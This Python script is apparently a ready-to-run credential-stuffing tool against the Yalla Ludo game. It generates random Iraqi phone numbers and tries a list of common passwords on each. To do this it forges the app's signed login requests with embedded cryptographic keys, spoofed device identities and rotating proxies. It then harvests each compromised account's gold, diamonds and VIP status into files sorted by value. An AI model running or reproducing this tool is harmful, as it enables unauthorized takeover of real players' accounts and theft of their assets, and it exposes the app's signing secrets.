#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Yalla Ludo - Iraq Number Checker (نسخة متقدمة مع Dashboard + 1000 Thread)
# By @to_ls

import base64
import json
import hashlib
import hmac
import time
import uuid
import random
import asyncio
import aiohttp
import sys
import os
import threading
from collections import defaultdict
from datetime import datetime
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as padlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich import box
    console = Console()
    RICH_AVAILABLE = True
except:
    RICH_AVAILABLE = False
    try:
        from colorama import init, Fore, Style
        init(autoreset=True)
    except:
        Fore = Style = type('obj', (object,), {
            'GREEN': '', 'RED': '', 'YELLOW': '', 'CYAN': '', 
            'MAGENTA': '', 'WHITE': '', 'RESET_ALL': ''
        })()

# ============================================================
# CONFIG
# ============================================================
VER = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
VERH = "1.4.9.2"
SPRE = "2.0_2_"
L3 = "L3)qk*@8"
MKEY = b"4e82797b276c5cb729db62aaa229a057"
MIV = b"0102030405060708"
K = "8a9520f016427a54d5de40335bf7e4fe"
HERA = "f580270da66e44438d5ed30fdb08ebba"

LOGIN_PATH = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
TIMEOUT = 15

# ============================================================
# DOMAINS
# ============================================================
DOMAINS = [
    "httpgateway.lampjkl.com",
    "httpgateway.carrstuv.com",
    "httpgateway.funcdeg.com",
    "httpgateway.planecde.com",
    "httpgateway.yalla.games",
    "httpgateway.foodjkl.com",
    "httpgateway.penabcd.com",
    "pay.lampjkl.com",
]

LOGIN_SERVERS = [f"https://{domain}" for domain in DOMAINS]
PROFILE_SRVS = [f"https://{domain}" for domain in DOMAINS]

# ============================================================
# PROXY MANAGER
# ============================================================
class ProxyManager:
    def __init__(self, proxy_file=""):
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = set()
        self.proxy_lock = threading.Lock()
        self.current_index = 0
        self.use_proxies = False
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file):
        try:
            with open(proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        # دعم صيغ متعددة
                        if '://' in line:
                            line = line.split('://')[1]
                        self.proxies.append(line)
            if self.proxies:
                self.use_proxies = True
                if RICH_AVAILABLE:
                    console.print(f"[green][+][/green] Loaded {len(self.proxies)} proxies")
                else:
                    print(f"[+] Loaded {len(self.proxies)} proxies")
        except Exception as e:
            if RICH_AVAILABLE:
                console.print(f"[red][-][/red] Error loading proxies: {e}")
            else:
                print(f"[-] Error loading proxies: {e}")
    
    def _parse_proxy(self, line):
        if '@' in line:
            parts = line.split('@')
            if len(parts) == 2:
                auth = parts[0].split(':')
                address = parts[1].split(':')
                if len(auth) == 2 and len(address) == 2:
                    return {'ip': address[0], 'port': address[1], 'user': auth[0], 'pass': auth[1]}
        
        parts = line.split(':')
        if len(parts) == 4:
            return {'ip': parts[0], 'port': parts[1], 'user': parts[2], 'pass': parts[3]}
        if len(parts) == 2:
            return {'ip': parts[0], 'port': parts[1], 'user': None, 'pass': None}
        return None
    
    def get_proxy(self):
        if not self.use_proxies or not self.proxies:
            return None
        
        with self.proxy_lock:
            # تجربة بروكسي شغال أولاً
            if self.working_proxies:
                proxy = random.choice(self.working_proxies)
                return proxy
            
            # جلب بروكسي جديد
            for _ in range(10):
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1
                if proxy not in self.failed_proxies:
                    return proxy
            
            # إذا كلهم فشلوا، نرجع أي بروكسي
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def mark_working(self, proxy_str):
        if not proxy_str:
            return
        with self.proxy_lock:
            if proxy_str not in self.working_proxies:
                self.working_proxies.append(proxy_str)
                if proxy_str in self.failed_proxies:
                    self.failed_proxies.remove(proxy_str)
    
    def mark_failed(self, proxy_str):
        if not proxy_str:
            return
        with self.proxy_lock:
            self.failed_proxies.add(proxy_str)
            if proxy_str in self.working_proxies:
                self.working_proxies.remove(proxy_str)
    
    def get_stats(self):
        with self.proxy_lock:
            return {
                "total": len(self.proxies),
                "working": len(self.working_proxies),
                "failed": len(self.failed_proxies)
            }

proxy_manager = ProxyManager("/storage/emulated/0/Download/Telegram/proxyscrape_premium_http_proxies.txt")

# ============================================================
# CRYPTO FUNCTIONS
# ============================================================
def _aes_cbc(key, iv, pt):
    pad = padlib.PKCS7(128).padder()
    pt2 = pad.update(pt) + pad.finalize()
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    e = c.encryptor()
    return e.update(pt2) + e.finalize()

def _xor_b64(data_str, key_str):
    kb = key_str.encode()
    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
    return base64.b64encode(xo).decode()

def _xor_decrypt(raw, key_str):
    kb = key_str.encode()
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(raw))

def _gen_shu():
    import secrets
    raw = secrets.token_bytes(28)
    return base64.b64encode(raw).decode().replace("+","-").replace("/","_").rstrip("=")[:38]

def _rdev():
    devs = [
        ("OnePlus 9 Pro", "LE2123", "IQ", "IQ", 2),
        ("Samsung Galaxy S21", "SM-G991B", "IQ", "IQ", 2),
        ("Xiaomi Mi 11", "M2011K2G", "IQ", "IQ", 2),
        ("Oppo Reno 6", "CPH2235", "IQ", "IQ", 2),
        ("Samsung Galaxy A52", "SM-A525F", "IQ", "IQ", 2),
        ("Huawei P40 Pro", "ELS-NX9", "IQ", "IQ", 2),
    ]
    nm, md, pc, sc, dt = random.choice(devs)
    return {
        "deviceId": str(uuid.uuid4()),
        "deviceName": f"{nm.split()[0].lower()} {md}",
        "deviceType": dt,
        "phoneModel": md,
        "X-Phone-Country": pc,
        "X-Sim-Country": sc,
        "downloadChannelId": 1,
        "shuMengId": _gen_shu(),
        "AndroidId": uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
        "plateType": 0,
        "LanguageId": 2,
        "appType": 0,
    }

def _gen_traceparent():
    return f"00-{uuid.uuid4().hex+uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"

# ============================================================
# BUILD REQUESTS
# ============================================================
def _build_login(mobile, password, area_code):
    d = _rdev()
    now = int(time.time() * 1000)
    nc = f"{random.randint(0, 2**31-1)}_{uuid.uuid4()}"

    bag = {
        "timeSpan": str(now), "version": VERH,
        "deviceId": d["deviceId"], "deviceName": d["deviceName"],
        "deviceType": d["deviceType"], "downloadChannelId": d["downloadChannelId"],
        "shuMengId": d["shuMengId"], "nonce": nc,
        "plateType": d["plateType"], "LanguageId": d["LanguageId"],
        "phoneModel": d["phoneModel"], "X-Phone-Country": d["X-Phone-Country"],
        "X-Sim-Country": d["X-Sim-Country"], "AndroidId": d["AndroidId"],
        "appType": d["appType"],
    }
    bb = base64.b64encode(
        json.dumps(bag, separators=(",",":"), ensure_ascii=False).encode()
    ).decode()

    sg = LOGIN_PATH + VER + bb
    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs = SPRE + sig
    p = hashlib.md5(sg.encode()).hexdigest()
    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    phex = hashlib.md5(password.encode()).hexdigest().upper()
    body = {
        "mobile": mobile, "areaCode": area_code, "password": phex,
        "languageId": d["LanguageId"], "nationalityId": 1,
        "hostConfig": [
            {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.moonlmn.com", "type": 2, "version": 4},
            {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.lampjkl.com", "type": 2, "version": 19},
            {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.lampjkl.com", "type": 2, "version": 20},
        ],
        "simCountry": "", "version": VERH,
        "deviceId": d["deviceId"], "deviceName": d["deviceName"],
        "deviceType": d["deviceType"], "downloadChannelId": d["downloadChannelId"],
        "shuMengId": d["shuMengId"], "nonce": nc, "plateType": d["plateType"],
        "phoneModel": d["phoneModel"], "X-Phone-Country": d["X-Phone-Country"],
        "X-Sim-Country": d["X-Sim-Country"], "AndroidId": d["AndroidId"],
        "IsSubpackages": 0, "appType": d["appType"],
    }
    bs = json.dumps(body, separators=(",",":"), ensure_ascii=False).replace("/", "\\/")
    pm = _xor_b64(bs, K)

    ts = now + random.randint(40, 80)
    hd = {
        "User-Agent": VER, "UserId": "0", "X-App-Id": "ludo",
        "X-Baggage": bb, "X-Access-Token": "",
        "X-Timestamp": str(ts), "versionString": VERH,
        "X-Sign": xs, "X-Hera": HERA,
        "X-Time": str(ts + random.randint(30, 60)),
        "X-Medusa": xm,
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "baggage": "service.name=ludo",
        "traceparent": _gen_traceparent(),
    }
    return {"headers": hd, "payload": {"paramJsonString": pm}, "dev": d}

def _build_profile(token, user_id, dev):
    now = int(time.time() * 1000)
    nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
    bag_sign = hashlib.md5((K + nc).encode()).hexdigest().upper()

    bag = {
        "token": token, "sign": bag_sign, "timeSpan": str(now),
        "version": VERH, "deviceId": dev["deviceId"], "deviceName": dev["deviceName"],
        "deviceType": dev["deviceType"], "downloadChannelId": dev["downloadChannelId"],
        "shuMengId": dev["shuMengId"], "nonce": nc,
        "plateType": dev["plateType"], "LanguageId": dev["LanguageId"],
        "phoneModel": dev["phoneModel"], "X-Phone-Country": dev["X-Phone-Country"],
        "X-Sim-Country": dev["X-Sim-Country"], "AndroidId": dev["AndroidId"],
        "appType": dev["appType"],
    }
    bb = base64.b64encode(
        json.dumps(bag, separators=(",",":"), ensure_ascii=False).encode()
    ).decode()

    sg = PROFILE_PATH + token + VER + bb
    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs = SPRE + sig
    p = hashlib.md5(sg.encode()).hexdigest()
    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    hd = {
        "User-Agent": VER, "UserId": user_id, "X-App-Id": "ludo",
        "X-Baggage": bb, "X-Access-Token": token,
        "X-Timestamp": str(now + random.randint(50, 300)),
        "versionString": VERH, "X-Sign": xs, "X-Hera": HERA,
        "X-Time": str(now + random.randint(50, 300)),
        "X-Medusa": xm,
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
    }
    uid_int = int(user_id) if str(user_id).isdigit() else user_id
    pm = _xor_b64(json.dumps({"accountId": uid_int}, separators=(",",":")), K)
    return hd, {"paramJsonString": pm}

# ============================================================
# LOGIN & PROFILE (Async)
# ============================================================
async def login_account(session, mobile, password, area_code=964, proxy=None):
    rq = _build_login(mobile, password, area_code)
    
    for server in LOGIN_SERVERS:
        try:
            url = server + LOGIN_PATH
            
            async with session.post(url, json=rq["payload"], headers=rq["headers"], 
                                   proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status != 200:
                    continue
                
                obj = await r.json()
                param = obj.get("paramJsonString", "")
                if param:
                    raw = base64.b64decode(param)
                    decrypted = _xor_decrypt(raw, K)
                    result = json.loads(decrypted.decode('utf-8'))
                else:
                    result = obj
                
                if result.get("status") == 0:
                    data = result.get("data") or {}
                    token = data.get("token", "")
                    user_id = str(data.get("id", data.get("showNumId", "")))
                    
                    if token and user_id:
                        profile = await fetch_profile(session, token, user_id, rq["dev"], proxy)
                        return {
                            "success": True,
                            "data": data,
                            "token": token,
                            "user_id": user_id,
                            "dev": rq["dev"],
                            "profile": profile
                        }
                    else:
                        return {"success": True, "data": data, "token": token, "user_id": user_id, "dev": rq["dev"], "profile": None}
                else:
                    return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
        except Exception as e:
            continue
    
    return {"success": False, "error": "All servers failed"}

async def fetch_profile(session, token, user_id, dev, proxy=None):
    if not token or not user_id:
        return None
    
    for server in PROFILE_SRVS:
        try:
            hd, body = _build_profile(token, user_id, dev)
            url = server + PROFILE_PATH
            
            async with session.post(url, json=body, headers=hd, proxy=proxy, 
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status in (403, 500, 404):
                    continue
                
                obj = await r.json()
                param = obj.get("paramJsonString", "")
                if param:
                    raw = base64.b64decode(param)
                    decrypted = _xor_decrypt(raw, K)
                    result = json.loads(decrypted.decode('utf-8'))
                else:
                    result = obj
                
                if result.get("status") == 0:
                    return result.get("data", {})
        except Exception:
            continue
    
    return None

# ============================================================
# PASSWORDS & NUMBERS
# ============================================================
PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]

PREFIXES = {
    "اسيا": ["770", "771", "772", "773", "774", "775", "776", "777", "778", "779"],
    "زين": ["780", "781", "782", "783", "784", "785", "786", "787", "788", "789"],
    "كورك": ["790", "791", "792", "793", "794", "795", "796", "797", "798", "799"]
}

used_numbers = set()
used_lock = threading.Lock()

def generate_mobile_iq():
    while True:
        company = random.choice(list(PREFIXES.keys()))
        prefix = random.choice(PREFIXES[company])
        suffix = ''.join(random.choices('0123456789', k=7))
        mobile = prefix + suffix
        with used_lock:
            if mobile not in used_numbers:
                used_numbers.add(mobile)
                return mobile

# ============================================================
# STATISTICS
# ============================================================
stats = defaultdict(int)
gold_stats = defaultdict(int)
diamond_stats = defaultdict(int)
level_stats = defaultdict(int)
vip_stats = defaultdict(int)
found_accounts = []
verify_accounts = []
stats_lock = threading.Lock()
stop_flag = False
start_time = time.time()

# ============================================================
# CHECK NUMBER
# ============================================================
async def check_number_async(session, mobile, semaphore, proxy=None):
    global stats, gold_stats, diamond_stats, level_stats, vip_stats, found_accounts, verify_accounts, stop_flag
    
    async with semaphore:
        for pwd in PASSWORDS_IQ:
            if stop_flag:
                return
            
            try:
                result = await login_account(session, mobile, pwd, 964, proxy)
                
                if result.get("success"):
                    data = result.get("data", {})
                    name = data.get("name", data.get("nickName", ""))
                    uid = result.get("user_id", "")
                    
                    if not name or name == "" or name == "Unknown" or name == " ":
                        with stats_lock:
                            stats['verification_needed'] += 1
                            stats['total'] += 1
                        
                        verify_account = {
                            'phone': mobile,
                            'password': pwd,
                            'name': name if name else 'EMPTY',
                            'uid': uid,
                            'reason': 'EMPTY_NAME'
                        }
                        verify_accounts.append(verify_account)
                        return
                    
                    gold = 0
                    diamond = 0
                    level = 0
                    exp = 0
                    max_exp = 0
                    royal = 0
                    is_vip = False
                    vip_type = ""
                    vip_end_time = 0
                    
                    profile = result.get("profile")
                    if profile:
                        base = profile.get("baseInfo", profile)
                        gold = int(base.get("goldNum", base.get("gold", 0)) or 0)
                        diamond = int(base.get("diamondNum", base.get("diamond", 0)) or 0)
                        level = int(base.get("levelId", base.get("level", 0)) or 0)
                        exp = int(base.get("experience", 0) or 0)
                        max_exp = int(base.get("maxExp", 100) or 100)
                        royal = int(base.get("royalLevel", 0) or 0)
                        is_vip = base.get("isVip", False)
                        
                        vip_info = profile.get("vipInfo", {})
                        if vip_info:
                            vip_type = vip_info.get("vipType", "")
                            vip_end_time = vip_info.get("vipEndTime", 0)
                    
                    if gold == 0 and diamond == 0 and level == 0:
                        with stats_lock:
                            stats['verification_needed'] += 1
                            stats['total'] += 1
                        return
                    
                    account_data = {
                        'phone': mobile,
                        'password': pwd,
                        'name': name,
                        'uid': uid,
                        'gold': gold,
                        'diamond': diamond,
                        'level': level,
                        'exp': exp,
                        'max_exp': max_exp,
                        'royal': royal,
                        'is_vip': is_vip,
                        'vip_type': vip_type,
                        'vip_end_time': vip_end_time
                    }
                    
                    with stats_lock:
                        stats['good'] += 1
                        stats['total'] += 1
                        
                        if gold < 1000000:
                            gold_stats["0-999K"] += 1
                        elif gold < 5000000:
                            gold_stats["1M-4.9M"] += 1
                        elif gold < 10000000:
                            gold_stats["5M-9.9M"] += 1
                        elif gold < 50000000:
                            gold_stats["10M-49M"] += 1
                        elif gold < 100000000:
                            gold_stats["50M-99M"] += 1
                        else:
                            gold_stats["100M+"] += 1
                        
                        if diamond < 10000:
                            diamond_stats["0-9.9K"] += 1
                        elif diamond < 50000:
                            diamond_stats["10K-49K"] += 1
                        elif diamond < 100000:
                            diamond_stats["50K-99K"] += 1
                        elif diamond < 500000:
                            diamond_stats["100K-499K"] += 1
                        elif diamond < 1000000:
                            diamond_stats["500K-999K"] += 1
                        else:
                            diamond_stats["1M+"] += 1
                        
                        if level < 10:
                            level_stats["Level 0-9"] += 1
                        elif level < 20:
                            level_stats["Level 10-19"] += 1
                        elif level < 30:
                            level_stats["Level 20-29"] += 1
                        elif level < 40:
                            level_stats["Level 30-39"] += 1
                        else:
                            level_stats["Level 40+"] += 1
                        
                        if is_vip:
                            vip_stats["VIP"] += 1
                        else:
                            vip_stats["Non-VIP"] += 1
                        
                        found_accounts.append(account_data)
                    
                    # حفظ الحسابات
                    save_account(account_data)
                    
                    # تسجيل البروكسي كشغال
                    if proxy:
                        proxy_manager.mark_working(proxy)
                    
                    return
                    
                else:
                    status = result.get("status", -1)
                    if status == 151 or status == 182:
                        continue
                    else:
                        with stats_lock:
                            stats['not_registered'] += 1
                            stats['total'] += 1
                        return
                        
            except Exception as e:
                with stats_lock:
                    stats['error'] += 1
                    stats['total'] += 1
                # تسجيل البروكسي كفاشل
                if proxy:
                    proxy_manager.mark_failed(proxy)
                continue
        
        with stats_lock:
            stats['wrong_pass'] += 1
            stats['total'] += 1

def save_account(account):
    try:
        gold = account.get('gold', 0)
        phone = account['phone']
        password = account['password']
        
        # حفظ حسب الذهب
        if gold < 1000000:
            filename = "gold_0_1M.txt"
        elif gold < 5000000:
            filename = "gold_1M_5M.txt"
        elif gold < 10000000:
            filename = "gold_5M_10M.txt"
        elif gold < 50000000:
            filename = "gold_10M_50M.txt"
        elif gold < 100000000:
            filename = "gold_50M_100M.txt"
        else:
            filename = "gold_100M_plus.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{phone}:{password}\n")
        
        with open("good_accounts_full.txt", 'a', encoding='utf-8') as f:
            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
            f.write(f"Phone: {phone} | Pass: {password} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
    except:
        pass

# ============================================================
# DASHBOARD
# ============================================================
def create_dashboard():
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    with stats_lock:
        total = stats['total']
        good = stats['good']
        wrong = stats['wrong_pass']
        notreg = stats['not_registered']
        errors = stats['error']
        verification = stats['verification_needed']
        vip_count = vip_stats.get('VIP', 0)
        non_vip_count = vip_stats.get('Non-VIP', 0)
    
    proxy_stats = proxy_manager.get_stats() if proxy_manager else {"total": 0, "working": 0, "failed": 0}
    
    if RICH_AVAILABLE:
        # جدول الإحصائيات
        stats_table = Table(show_header=False, box=box.ROUNDED, border_style="bright_blue")
        stats_table.add_column("", style="cyan", width=15)
        stats_table.add_column("", style="green", justify="right")
        
        stats_table.add_row("Elapsed", f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        stats_table.add_row("Checked", f"[green]{total}[/green]")
        stats_table.add_row("Hits", f"[green]{good}[/green]")
        stats_table.add_row("Bads", f"[green]{wrong + notreg}[/green]")
        stats_table.add_row("Verify", f"[yellow]{verification}[/yellow]")
        stats_table.add_row("Errors", f"[green]{errors}[/green]")
        stats_table.add_row("VIP", f"[magenta]{vip_count}[/magenta]")
        stats_table.add_row("Non-VIP", f"[white]{non_vip_count}[/white]")
        
        # جدول الذهب
        gold_table = Table(show_header=False, box=box.MINIMAL)
        gold_table.add_column("", style="yellow")
        gold_table.add_column("", style="green", justify="right")
        gold_table.add_row("0-999K", str(gold_stats.get('0-999K', 0)))
        gold_table.add_row("1M-4.9M", str(gold_stats.get('1M-4.9M', 0)))
        gold_table.add_row("5M-9.9M", str(gold_stats.get('5M-9.9M', 0)))
        gold_table.add_row("10M-49M", str(gold_stats.get('10M-49M', 0)))
        gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
        gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
        
        # جدول الجواهر
        diamond_table = Table(show_header=False, box=box.MINIMAL)
        diamond_table.add_column("", style="cyan")
        diamond_table.add_column("", style="green", justify="right")
        diamond_table.add_row("0-9.9K", str(diamond_stats.get('0-9.9K', 0)))
        diamond_table.add_row("10K-49K", str(diamond_stats.get('10K-49K', 0)))
        diamond_table.add_row("50K-99K", str(diamond_stats.get('50K-99K', 0)))
        diamond_table.add_row("100K-499K", str(diamond_stats.get('100K-499K', 0)))
        diamond_table.add_row("500K-999K", str(diamond_stats.get('500K-999K', 0)))
        diamond_table.add_row("1M+", str(diamond_stats.get('1M+', 0)))
        
        # جدول المستويات
        level_table = Table(show_header=False, box=box.MINIMAL)
        level_table.add_column("", style="magenta")
        level_table.add_column("", style="green", justify="right")
        level_table.add_row("Level 0-9", str(level_stats.get('Level 0-9', 0)))
        level_table.add_row("Level 10-19", str(level_stats.get('Level 10-19', 0)))
        level_table.add_row("Level 20-29", str(level_stats.get('Level 20-29', 0)))
        level_table.add_row("Level 30-39", str(level_stats.get('Level 30-39', 0)))
        level_table.add_row("Level 40+", str(level_stats.get('Level 40+', 0)))
        
        # آخر الحسابات
        last_found_text = ""
        for acc in found_accounts[-5:]:
            vip_status = "✅VIP" if acc['is_vip'] else "❌"
            last_found_text += f"  [green]{acc['phone']}[/green] | Pass: [yellow]{acc['password']}[/yellow] | Gold:[green]{acc['gold']:,}[/green] | Diamond:[green]{acc['diamond']:,}[/green] | Lv:[green]{acc['level']}[/green] | VIP:{vip_status}\n"
        if not last_found_text:
            last_found_text = "  No accounts found yet..."
        
        layout = Layout()
        layout.split_column(
            Layout(Panel(Text("YALLA LUDO CHECKER - Iraq Only", style="bold bright_blue"), box=box.HEAVY)),
            Layout(Panel(stats_table, title="[bold]Statistics", border_style="blue")),
            Layout(name="middle"),
            Layout(Panel(last_found_text, title="[bold green]Last Found Accounts", border_style="green")),
            Layout(Panel(f"By @to_ls | Proxies: [green]{proxy_stats['total']}[/green] (Working: [green]{proxy_stats['working']}[/green])", style="dim"))
        )
        
        layout["middle"].split_row(
            Layout(Panel(gold_table, title="[bold yellow]Gold Categories", border_style="yellow")),
            Layout(Panel(diamond_table, title="[bold cyan]Diamond Categories", border_style="cyan")),
            Layout(Panel(level_table, title="[bold magenta]Level Categories", border_style="magenta"))
        )
        
        return layout
    else:
        output = f"""
============================================================
                 YALLA LUDO CHECKER
              Iraq Only - 77xxxxxxxx
                By @to_ls
============================================================

------------------------------------------------------------

  Elapsed    : {hours:02d}:{minutes:02d}:{seconds:02d}
  Checked    : {total}

  Hits       : {good}
  Bads       : {wrong + notreg}
  Verify     : {verification}
  Errors     : {errors}
  VIP        : {vip_count}
  Non-VIP    : {non_vip_count}

------------------------------------------------------------

  GOLD CATEGORIES:
    0-999K    : {gold_stats.get('0-999K', 0)}
    1M-4.9M   : {gold_stats.get('1M-4.9M', 0)}
    5M-9.9M   : {gold_stats.get('5M-9.9M', 0)}
    10M-49M   : {gold_stats.get('10M-49M', 0)}
    50M-99M   : {gold_stats.get('50M-99M', 0)}
    100M+     : {gold_stats.get('100M+', 0)}

------------------------------------------------------------

  DIAMOND CATEGORIES:
    0-9.9K    : {diamond_stats.get('0-9.9K', 0)}
    10K-49K   : {diamond_stats.get('10K-49K', 0)}
    50K-99K   : {diamond_stats.get('50K-99K', 0)}
    100K-499K : {diamond_stats.get('100K-499K', 0)}
    500K-999K : {diamond_stats.get('500K-999K', 0)}
    1M+       : {diamond_stats.get('1M+', 0)}

------------------------------------------------------------

  LEVEL CATEGORIES:
    Level 0-9   : {level_stats.get('Level 0-9', 0)}
    Level 10-19 : {level_stats.get('Level 10-19', 0)}
    Level 20-29 : {level_stats.get('Level 20-29', 0)}
    Level 30-39 : {level_stats.get('Level 30-39', 0)}
    Level 40+   : {level_stats.get('Level 40+', 0)}

------------------------------------------------------------

  LAST FOUND ACCOUNTS:
"""
        for acc in found_accounts[-5:]:
            vip_status = "VIP" if acc['is_vip'] else "Non-VIP"
            output += f"    {acc['phone']} | Pass: {acc['password']} | Gold:{acc['gold']} | Diamond:{acc['diamond']} | Lv:{acc['level']} | {vip_status}\n"
        if not found_accounts:
            output += "    No accounts found yet...\n"
        
        output += f"""
------------------------------------------------------------
  By @to_ls | Proxies: {proxy_stats['total']} (Working: {proxy_stats['working']})
"""
        return output

def dashboard_loop():
    if RICH_AVAILABLE:
        with Live(create_dashboard(), refresh_per_second=1, screen=True) as live:
            while not stop_flag:
                live.update(create_dashboard())
                time.sleep(1)
    else:
        while not stop_flag:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(create_dashboard())
            time.sleep(1)

# ============================================================
# MAIN
# ============================================================
async def main_async():
    global stop_flag
    
    if RICH_AVAILABLE:
        console.print(Panel("Yalla Ludo - Fast Checker - Iraq Only\nWith Residential Proxies Support\nBy @to_ls", style="bold blue", box=box.HEAVY))
    else:
        print("""
============================================================
     Yalla Ludo - Fast Checker - Iraq Only
     Speed + Full Account Info
     With Residential Proxies Support
     By @to_ls
============================================================
        """)
    
    # ============================================================
    # عدد الـ Threads = 1000
    # ============================================================
    concurrency = 100
    semaphore = asyncio.Semaphore(concurrency)
    
    threading.Thread(target=dashboard_loop, daemon=True).start()
    
    connector = aiohttp.TCPConnector(
        limit=concurrency*2,
        limit_per_host=concurrency,
        force_close=False,
        enable_cleanup_closed=True
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        while not stop_flag:
            mobile = generate_mobile_iq()
            proxy = proxy_manager.get_proxy() if proxy_manager.use_proxies else None
            task = asyncio.create_task(check_number_async(session, mobile, semaphore, proxy))
            tasks.append(task)
            
            # الحفاظ على عدد المهام
            if len(tasks) > 5000:
                done, pending = await asyncio.wait(tasks[:1000], return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending) + tasks[1000:]
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

def run():
    asyncio.run(main_async())

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        stop_flag = True
        if RICH_AVAILABLE:
            console.print("\n[yellow][!][/yellow] Stopped.")
            console.print("\n[bold green]Final Report:[/bold green]")
            elapsed = int(time.time() - start_time)
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            with stats_lock:
                console.print(f"  Time: [green]{hours:02d}:{minutes:02d}:{seconds:02d}[/green]")
                console.print(f"  Hits: [green]{stats['good']}[/green]")
                console.print(f"  Verify: [yellow]{stats['verification_needed']}[/yellow]")
                console.print(f"  VIP: [magenta]{vip_stats.get('VIP', 0)}[/magenta]")
                console.print(f"  Non-VIP: [white]{vip_stats.get('Non-VIP', 0)}[/white]")
                console.print("  Gold Categories:")
                for cat, count in sorted(gold_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
                console.print("  Diamond Categories:")
                for cat, count in sorted(diamond_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
                console.print("  Level Categories:")
                for cat, count in sorted(level_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
            console.print("\n[magenta]By @to_ls[/magenta]")
        else:
            print("\n[!] Stopped.")
            print("\n[+] Final Report:")
            elapsed = int(time.time() - start_time)
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            with stats_lock:
                print(f"    Time: {hours:02d}:{minutes:02d}:{seconds:02d}")
                print(f"    Hits: {stats['good']}")
                print(f"    Verify: {stats['verification_needed']}")
                print(f"    VIP: {vip_stats.get('VIP', 0)}")
                print(f"    Non-VIP: {vip_stats.get('Non-VIP', 0)}")
                print(f"    Gold Categories:")
                for cat, count in sorted(gold_stats.items()):
                    print(f"      - {cat}: {count}")
                print(f"    Diamond Categories:")
                for cat, count in sorted(diamond_stats.items()):
                    print(f"      - {cat}: {count}")
                print(f"    Level Categories:")
                for cat, count in sorted(level_stats.items()):
                    print(f"      - {cat}: {count}")
            print("\nBy @to_ls")
